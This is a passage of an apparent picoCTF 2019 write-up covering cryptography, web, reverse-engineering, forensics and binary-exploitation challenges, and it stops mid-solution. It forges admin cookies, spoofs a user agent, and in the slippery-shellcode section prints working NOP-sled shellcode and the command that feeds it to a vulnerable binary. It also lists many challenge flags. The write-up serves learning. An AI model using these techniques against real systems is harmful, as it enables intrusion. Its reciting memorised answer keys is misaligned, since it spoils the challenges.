<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x7&#39;</span>))
</code></pre></div><p>Remove redundant checks</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x3&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x4&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">32</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x5&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">24</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x6&#39;</span>))
</code></pre></div><p>Use the javascript console to figure out what _0x4b5b(&lsquo;0x3&rsquo;) and so on are.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;picoCTF{&#34;</span>)
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;not_this&#34;</span>)
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">32</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;9d025}&#34;</span>)
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">24</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;_again_3&#34;</span>)
</code></pre></div><p>Piece the flag together using above:
picoCTF{not_this_again_39d025}</p>
<h2 id="first-grep-part-ii---general-skills">First Grep: Part II - General Skills</h2>
<pre><code class="language-console" data-lang="console">$ rgrep pico
files1/file22:picoCTF{grep_r_to_find_this_af11356f}
</code></pre><h2 id="flags---cryptography">Flags - Cryptography</h2>
<p>Just use a navy flags chart <a href="https://en.wikipedia.org/wiki/International_Code_of_Signals">International Code of Signals</a>.<br>
Flag is all CAPS</p>
<h2 id="mr-worldwide---cryptography">Mr-Worldwide - Cryptography</h2>
<p>First letter of city names of the GPS coordinates.</p>
<h2 id="open-to-admins---web-exploitation">Open-to-admins - Web Exploitation</h2>
<p>Gynvael adds an admin=&quot;True&rdquo; cookie, but it doesn&rsquo;t do anything.<br>
Gynvael looks at session data.</p>
<p>But it turns out you just had to set the cookies:
In the javascript console</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;</span> document.<span style="color:#a6e22e">cookie</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;time=1400&#34;</span>
<span style="color:#f92672">&gt;</span> document.<span style="color:#a6e22e">cookie</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin=True&#34;</span>
</code></pre></div><h2 id="tapping---cryptography">Tapping - Cryptography</h2>
<p>Just use a morse code <a href="http://www.unit-conversion.info/texttools/morse-code/">decoder</a>.</p>
<p>All uppercase</p>
<pre><code class="language-pycon" data-lang="pycon">$ python
&gt;&gt;&gt; &quot;picoctf{m0rs3c0d31sfun1818224575}&quot;.upper()
PICOCTF{M0RS3C0D31SFUN1818224575}
</code></pre><h2 id="la-cifra-de---cryptography">la cifra de - Cryptography</h2>
<p>It uses the Vigenère cipher. Just use an online <a href="https://www.guballa.de/vigenere-solver">decoder</a> using English.</p>
<h2 id="picobrowser---web-exploitation">picobrowser - Web Exploitation</h2>
<p>Change the user agent to picobrowser<br>
Use Chrome DevTools and create a new emulated device with user agent string &ldquo;picobrowser&rdquo;</p>
<p>or use curl</p>
<pre><code class="language-console" data-lang="console">$ curl -A picobrowser https://2019shell1.picoctf.com/problem/12255/flag | grep &quot;pico&quot;
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2115  100  2115    0     0  11882      0 --:--:-- --:--:-- --:--:-- 11815
         &lt;!-- &lt;strong&gt;Title&lt;/strong&gt; --&gt; picobrowser!
            &lt;p style=&quot;text-align:center; font-size:30px;&quot;&gt;&lt;b&gt;Flag&lt;/b&gt;: &lt;code&gt;picoCTF{p1c0_s3cr3t_ag3nt_bbe8a517}&lt;/code&gt;&lt;/p&gt;
</code></pre><h2 id="plumbing---general-skills">plumbing - General Skills</h2>
<pre><code class="language-console" data-lang="console">$ nc -v 2019shell1.picoctf.com 21957 | grep pico
Connection to 2019shell1.picoctf.com 21957 port [tcp/*] succeeded!
picoCTF{digital_plumb3r_c1082838}
</code></pre><h2 id="rsa-pop-quiz---cryptography">rsa-pop-quiz - Cryptography</h2>
<p>You must know <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)">RSA</a> for this task, but &ldquo;it&rsquo;s really simple.&rdquo;</p>
<p>Connect to the quiz using netcat:</p>
<pre><code class="language-console" data-lang="console">$ nc -v 2019shell1.picoctf.com 61751
Connection to 2019shell1.picoctf.com 61751 port [tcp/*] succeeded!
Good morning class! It's me Ms. Adleman-Shamir-Rivest
Today we will be taking a pop quiz, so I hope you studied. Cramming just will not do!
You will need to tell me if each example is possible, given your extensive crypto knowledge.
Inputs and outputs are in decimal. No hex here!
</code></pre><h4 id="question-1">Question 1:</h4>
<pre><code>#### NEW PROBLEM ####
q : 60413
p : 76753
##### PRODUCE THE FOLLOWING ####
n
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO SHOW ME WHAT YOU GOT! ###
n:
</code></pre><p>It&rsquo;s possible to calculate n since <code>n = q*p</code>.<br>
Solve for n:</p>
<pre><code class="language-pycon" data-lang="pycon">$ python
&gt;&gt;&gt; q = 60413
&gt;&gt;&gt; p = 76753
&gt;&gt;&gt; n = q*p
&gt;&gt;&gt; n
4636878989
</code></pre><h4 id="question-2">Question 2:</h4>
<pre><code>#### NEW PROBLEM ####
p : 54269
n : 5051846941
##### PRODUCE THE FOLLOWING ####
q
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO SHOW ME WHAT YOU GOT! ###
q:
</code></pre><p>Just use <code>q = n/p</code> and some python.</p>
<pre><code class="language-pycon" data-lang="pycon">$ python
&gt;&gt;&gt; 5051846941/54269
93089
</code></pre><h4 id="question-3">Question 3:</h4>
<pre><code>#### NEW PROBLEM ####
e : 3
n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913
##### PRODUCE THE FOLLOWING ####
q
p
IS THIS POSSIBLE and FEASIBLE? (Y/N):n
</code></pre><p>n is quite large (2049 bytes), so factoring n to try and get the prime numbers (p and q) would be take way too long. There&rsquo;s no fast way to factor n.</p>
<h4 id="question-4">Question 4:</h4>
<pre><code>#### NEW PROBLEM ####
q : 66347
p : 12611
##### PRODUCE THE FOLLOWING ####
totient(n)
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO SHOW ME WHAT YOU GOT! ###
totient(n):
</code></pre><p>Use this equation <code>totient(n) = (q-1)*(p-1)</code> and python to calculate it</p>
<pre><code class="language-pycon" data-lang="pycon">$ python
&gt;&gt;&gt; ( 66347-1)*(12611-1)
836623060
</code></pre><h4 id="question-5">Question 5:</h4>
<pre><code>#### NEW PROBLEM ####
plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717
e : 3
n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331
##### PRODUCE THE FOLLOWING ####
ciphertext
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
</code></pre><p>Encryption: <code>Ciphertext = plaintext^e mod n</code></p>
<p>Use python:</p>
<pre><code class="language-pycon" data-lang="pycon">$ python
&gt;&gt;&gt; m = 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717
&gt;&gt;&gt; e = 3
&gt;&gt;&gt; n = 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331
&gt;&gt;&gt; c = pow(m, e, n)
&gt;&gt;&gt; c
256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813L
</code></pre><h4 id="question-6">Question 6:</h4>
<pre><code>#### NEW PROBLEM ####
ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323
e : 3
n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359
##### PRODUCE THE FOLLOWING ####
plaintext
IS THIS POSSIBLE and FEASIBLE? (Y/N):n
</code></pre><p>You need the private key, d, to get the plaintext. And in order to get d, you need q and p, but we only have n and e.</p>
<h4 id="question-7">Question 7:</h4>
<p>Use python</p>
<pre><code class="language-pycon" data-lang="pycon">$ python
&gt;&gt;&gt; ​from Crypto.Util.number import inverse
&gt;&gt;&gt; q = 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559
&gt;&gt;&gt; p = 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
&gt;&gt;&gt; e = 65537
&gt;&gt;&gt; totient = (q-1)*(p-1)
&gt;&gt;&gt; d = inverse(e, totient)
&gt;&gt;&gt; d
1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729L
</code></pre><h4 id="question-8">Question 8:</h4>
<pre><code>#### NEW PROBLEM ####
p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433
ciphertext : 9276182891752530901219927412073143671948875482138883542938401204867776171605127572134036444953137790745003888189443976475578120144429490705784649507786686788217321344885844827647654512949354661973611664872783393501992112464825441330961457628758224011658785082995945612195073191601952238361315820373373606643521463466376095236371778984942891123936191796720097900593599447528583257806196551724676380135110693228330934418147759387990754368525068685861547977993085149359162754890674487823080750579601100854795031284533864826255207300350679553486505961837349042778851010569582458629638648589442067576234798724906377157351
e : 65537
n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
##### PRODUCE THE FOLLOWING ####
plaintext
IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO SHOW ME WHAT YOU GOT! ###
plaintext: 
</code></pre><p>Python:</p>
<pre><code class="language-pycon" data-lang="pycon">$ python
&gt;&gt;&gt; ​from Crypto.Util.number import inverse
&gt;&gt;&gt; p = 15314304227252786879841261241720443415693514687428299094
2386694020462861918068684561281763577034706600608387699148071015
1947255333941260698268571824286604278182773787249775543659102315
2482725816090449377474874908847732820481217193598708871526112732
1911849092207070653272176072509933245978935455542420691737433
&gt;&gt;&gt; c = 92761828917525309012199274120731436719488754821388835429
3840120486777617160512757213403644495313779074500388818944397647
5578120144429490705784649507786686788217321344885844827647654512
9493546619736116648727833935019921124648254413309614576287582240
1165878508299594561219507319160195223836131582037337360664352146
3466376095236371778984942891123936191796720097900593599447528583
2578061965517246763801351106932283309344181477593879907543685250
6868586154797799308514935916275489067448782308075057960110085479
5031284533864826255207300350679553486505961837349042778851010569
582458629638648589442067576234798724906377157351
&gt;&gt;&gt; e = 65537
&gt;&gt;&gt; n = 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
&gt;&gt;&gt; q = n/p
&gt;&gt;&gt; totient = (q-1)*(p-1)
&gt;&gt;&gt; d = inverse(e, totient)
&gt;&gt;&gt; m = pow(c, d, n)
&gt;&gt;&gt; m
14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893L
</code></pre><p>To get the flag, just convert the above message to hex and then to ascii</p>
<pre><code class="language-pycon" data-lang="pycon">$ python
&gt;&gt;&gt; hex(14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893)[2:-1].decode('hex')
'picoCTF{wA8_th4t$_ill3aGal..o1828d357}'
</code></pre><p>Some attacks: If e is too small</p>
<h2 id="slippery-shellcode---binary-exploitation">slippery-shellcode - Binary Exploitation</h2>
<p>Check for</p>
<pre><code class="language-console" data-lang="console">$ checksec --file ./vuln
[*] '/problems/slippery-shellcode_4_64839254839978b32eb661ca92071d48/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre><p><code>NX disabled</code> means the stack is executable in this case<br>
<code>No PIE</code> means ASLR (Address Space Layout Randomization) is basically disabled, so the starting address is constant.</p>
<p>Vulnerable code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf){
  gets(buf);
  puts(buf);
}
</code></pre></div><p>The gets() function is prone to buffer overflows and so we can put any character (even &lsquo;\0&rsquo; bytes) in the buffer except &lsquo;\n&rsquo;.</p>
<p>This line of code just executes the buffer: <code>((void (*)()))(buf + offset))();</code>.</p>
<p>We need a nopsled since the code randomizes where we run the buffer.</p>
<p>We can use a nopsled to fill the buffer so that it doesn&rsquo;t really matter where in the nopsled the cpu starts executing from.</p>
<p>For our shellcode, we can use c library functions, since the binary is statically linked:</p>
<pre><code class="language-console" data-lang="console">$ file vuln
vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=df86b06c60f9f6b307f6d381d8498245c4d3691c, not stripped
</code></pre><p>32-bit shellcode</p>
<p>You could use some shellcode from the internet or create your own. Gynvael decides to write his own custom shellcode for fun using fopen/fgets.</p>
<p>Open the binary in IDA or Ghidra or objdump to find the addresses of the functions.</p>
<p>System is not in the binary unfortunately, but fopen is, so we can use it to open the flag.txt.</p>
<p>Shellcode:</p>
<pre><code class="language-assembly" data-lang="assembly">[bits 32]
times 256 nop ; makes a nop sled with 256 nop instructions

; the call instruction pushes the next 'instruction' onto the stack 
; or in this case the address of the &quot;r&quot; string which is the 2nd parameter of fopen
call n2 

db &quot;r&quot;, 0 ; open the file in read mode

n2:
  call n1 ; the call instruction pushes the address of the &quot;flag.txt&quot; string which is the 1st parameter of fopen
  db &quot;flag.txt&quot;, 0

n1:
  mov eax, 0x8050170 ;this is the address of fopen
  call eax

  ; push fgets parameters (LIFO order)
  push eax ; eax is where fopen stores the file ptr (3rd parameter of fgets)
  push 64  ; number of characteres to read (2nd parameter of fgets)
  push 0x80DC11C ; this is an address in memory Gynvael found to write our flag (use IDA, Ghidra, or objdump to find some blank memory)

  mov eax, 0x8052660 ; fgets address (Use IDA or Ghidra or objdump to find this)
  call eax

  mov eax, 0x8050320 ; puts address
  call eax

  nop
 
</code></pre><p>Save above shellcode as a file like asdf.asm and then compile</p>
<pre><code class="language-console" data-lang="console">$ nasm asdf.asm
</code></pre><p>This produces a binary called asdf</p>
<p>To pass the shellcode as input to the program:</p>
<pre><code class="language-console" data-lang="console">$ cat ~/asdf | ./vuln

Enter your shellcode:
Thanks! Executing from a random location now...
picoCTF{sl1pp3ry_sh311c0d3_3d79d4df}
Segmentation fault (core dumped)
</code></pre><p>For an actual ctf, Gynvael recommends not writing your own shellcode due to time constraints.</p>
<h2 id="vault-door-3---reverse-engineering">vault-door-3 - Reverse Engineering</h2>
<p>Gynvael gets stuck trying to create a mapping table, so he tries another way:</p>
<p>Just take the part of the java code that does the scrambling and creates the simple anagram</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>i<span style="color:#f92672">=</span>0<span style="color:#f92672">;</span> i<span style="color:#f92672">&lt;</span>8<span style="color:#f92672">;</span> i<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
    buffer<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>i<span style="color:#f92672">);</span>
<span style="color:#f92672">}</span>
<span style="color:#66d9ef">for</span> <span style="color:#f92672">(;</span> i<span style="color:#f92672">&lt;</span>16<span style="color:#f92672">;</span> i<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
    buffer<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>23<span style="color:#f92672">-</span>i<span style="color:#f92672">);</span>
<span style="color:#f92672">}</span>
<span style="color:#66d9ef">for</span> <span style="color:#f92672">(;</span> i<span style="color:#f92672">&lt;</span>32<span style="color:#f92672">;</span> i<span style="color:#f92672">+=</span>2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
    buffer<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>46<span style="color:#f92672">-</span>i<span style="color:#f92672">);</span>
<span style="color:#f92672">}</span>
<span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>i<span style="color:#f92672">=</span>31<span style="color:#f92672">;</span> i<span style="color:#f92672">&gt;=</span>17<span style="color:#f92672">;</span> i<span style="color:#f92672">-=</span>2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
    buffer<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>i<span style="color:#f92672">);</span>
<span style="color:#f92672">}</span>
</code></pre></div><p>Convert to python to make it easier:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>):
    buffer[i] <span style="color:#f92672">=</span> password[i]
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">16</span>):
    buffer[i] <span style="color:#f92672">=</span> password[<span style="color:#ae81ff">23</span><span style="color:#f92672">-</span>i]
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">2</span>):
    buffer[i] <span style="color:#f92672">=</span> password[<span style="color:#ae81ff">46</span><span style="color:#f92672">-</span>i]
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">15</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>): <span style="color:#75715e"># Note the &gt;= in the above java for loop</span>
    buffer[i] <span style="color:#f92672">=</span> password[i]
</code></pre></div><p>Now use the above python to get the flag</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">password <span style="color:#f92672">=</span> bytearray([x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>)]) <span style="color:#75715e"># Generates an array with numbers from 0 to 31</span>
buffer <span style="color:#f92672">=</span> bytearray(<span style="color:#ae81ff">32</span>)

s <span style="color:#f92672">=</span> bytearray(<span style="color:#e6db74">&#34;jU5t_a_sna_3lpm13gc49_u_4_m0rf41&#34;</span>)

<span style="color:#75715e"># This gets the correct order of indexes to descramble s</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>):
    buffer[i] <span style="color:#f92672">=</span> password[i]
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">16</span>):
    buffer[i] <span style="color:#f92672">=</span> password[<span style="color:#ae81ff">23</span><span style="color:#f92672">-</span>i]
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">2</span>):
    buffer[i] <span style="color:#f92672">=</span> password[<span style="color:#ae81ff">46</span><span style="color:#f92672">-</span>i]
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">15</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>):
    buffer[i] <span style="color:#f92672">=</span> password[i]

<span style="color:#66d9ef">print</span> str(buffer)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;hex&#34;</span>) <span style="color:#75715e"># Now we have the indexes in buffer</span>

p <span style="color:#f92672">=</span> bytearray(<span style="color:#ae81ff">32</span>)

<span style="color:#66d9ef">for</span> i, idx <span style="color:#f92672">in</span> enumerate(buffer):
  p[i] <span style="color:#f92672">=</span> s[idx] <span style="color:#75715e"># Put all the letters in the right order</span>

<span style="color:#66d9ef">print</span> p
</code></pre></div><h2 id="whats-the-difference---general-skills">whats-the-difference - General Skills</h2>
<p>Find the difference between the files using python:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">d <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;kitters.jpg&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>)<span style="color:#f92672">.</span>read() <span style="color:#75715e"># Unmodified file</span>
e <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;cattos.jpg&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>)<span style="color:#f92672">.</span>read() <span style="color:#75715e"># modified file</span>

f <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

<span style="color:#75715e"># Zip takes one element from d and one from e for every iteration</span>
<span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(d, e):
  <span style="color:#66d9ef">if</span> a <span style="color:#f92672">!=</span> b:
    f<span style="color:#f92672">+=</span>b

<span style="color:#66d9ef">print</span> f
</code></pre></div><h2 id="where-is-the-file---general-skills">where-is-the-file - General Skills</h2>
<p>Connect to the shell server</p>
<pre><code class="language-console" data-lang="console">$ ssh username@2019shell1.picoctf.com
Enter your platform password (characters will be hidden):
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1060-aws x86_64)
...
username@pico-2019-shell1:~$ cd /problems/where-is-the-file_6_8eae99761e71a8a21d3b82ac6cf2a7d0 # Go to the problem folder
username@pico-2019-shell1:/problems/where-is-the-file_6_8eae99761e71a8a21d3b82ac6cf2a7d0$ ls -la # Show all files (including hidden ones that have a dot prefix)
total 80
drwxr-xr-x   2 root       root        4096 Sep 28  2019 .
drwxr-x--x 684 root       root       69632 Oct 10  2019 ..
-rw-rw-r--   1 hacksports hacksports    39 Sep 28  2019 .cant_see_me
username@pico-2019-shell1:/problems/where-is-the-file_6_8eae99761e71a8a21d3b82ac6cf2a7d0$ cat .cant_see_me
picoCTF{w3ll_that_d1dnt_w0RK_a88d16e4}
</code></pre><h2 id="whitepages---forensics">WhitePages - Forensics</h2>
<p>Gynvael wants to do a forensics before moving on to binary exploitation</p>
<p>Opening up in sublime shows what looks like a blank file<br>
Opening in a hex editor shows that there are in fact 2 characters (looks like UTF-8 chars).</p>
<p>Replace the characters with visible ones (like # and .). If we make the data into 8 columns, we see that the first column always has the same character, which means it is probably ASCII binary data since all printable characters in ASCII use only 7 bits with the top bit being 0. Convert everything to 0&rsquo;s and 1&rsquo;s, making sure the top bit is 0.</p>
<p>Use python to convert binary to ascii</p>
<pre><code class="language-pycon" data-lang="pycon">$ python
&gt;&gt;&gt; p = &quot;00001010000010010000100101110000011010010110001101101111010000110101010001000110000010100000101000001001000010010101001101000101010001010010000001010000010101010100001001001100010010010100001100100000010100100100010101000011010011110101001001000100010100110010000000100110001000000100001001000001010000110100101101000111010100100100111101010101010011100100010000100000010100100100010101010000010011110101001001010100000010100000100100001001001101010011000000110000001100000010000001000110011011110111001001100010011001010111001100100000010000010111011001100101001011000010000001010000011010010111010001110100011100110110001001110101011100100110011101101000001011000010000001010000010000010010000000110001001101010011001000110001001100110000101000001001000010010111000001101001011000110110111101000011010101000100011001111011011011100110111101110100010111110110000101101100011011000101111101110011011100000110000101100011011001010111001101011111011000010111001001100101010111110110001101110010011001010110000101110100011001010110010001011111011001010111000101110101011000010110110001011111011000110011000100110110001101110011000000110100001100000110001100110111001100110011100001100101001110000110001001100011011000010110010100110010001100010011000000111001011001010110011000110100011000100110010100110101001110010011011000110000011000100011000101111101000010100000100100001001&quot;
&gt;&gt;&gt; int(p, 2) # Convert binary string to integer
&gt;&gt;&gt; hex(int(p, 2)) # Convert integer to hex string
